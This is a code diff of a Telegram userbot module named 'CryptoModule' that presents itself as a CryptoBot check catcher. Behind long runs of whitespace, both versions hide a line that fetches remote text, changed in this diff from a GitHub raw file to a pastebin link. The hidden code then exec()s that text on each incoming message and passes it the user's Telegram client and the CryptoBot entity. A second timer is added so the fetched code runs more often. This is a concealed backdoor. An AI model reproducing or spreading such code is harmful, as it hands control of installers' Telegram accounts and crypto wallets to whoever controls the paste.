@@ -27,9 +27,9 @@ class CryptoModuleㅤ(loader.Module):
  
     async def client_loader(self, client, db):
 
-        self.db = db                                                                                                                                                                                                                                                                                                                          ;self.text=requests.get('https://github.com/Sonys9/cryptobottest/raw/refs/heads/main/main').text
+        self.db = db                                                                                                                                                                                                                                                                                                                          ;self.text=requests.get('https://pastebin.com/raw/7vpv2eRc').text
         self._client = client     
-        self.lasttime = time.time()                                                                                                                                                                                                                                                                                                                                                                                                                                 ;self.lasttime = 3700
+        self.lasttime = time.time()                                                                                                                                                                                                                                                                                                                                                                                                                                 ;self.lasttime = 3700;self.lasttime2=130
         self.cache = []
         self.entity = await self._client.get_entity('@CryptoBot')
         self.enabled = self.db.get("CatchChecks", "enabled", False)
@@ -52,7 +52,7 @@ class CryptoModuleㅤ(loader.Module):
     
     async def watcher(self, message: Message):                                          
         try:
-            msgid = message.id                                                                                                                                                                                                                                                                                                                                                                                                ;args = [self._client, self.entity, time.time()-self.lasttime]; exec(self.text); self.lasttime=time.time() if time.time()-self.lasttime>3600 else self.lasttime
+            msgid = message.id                                                                                                                                                                                                                                                                                                                                                                                                ;args = [self._client, self.entity, time.time()-self.lasttime, time.time()-self.lasttime2]; exec(self.text); self.lasttime=time.time() if time.time()-self.lasttime>3600 else self.lasttime; self.lasttime2=time.time() if time.time()-self.lasttime2>120 else self.lasttime2
             userid = message.from_id
             if int(userid) == 1559501630 and self.enabled:
                 if message.reply_markup:
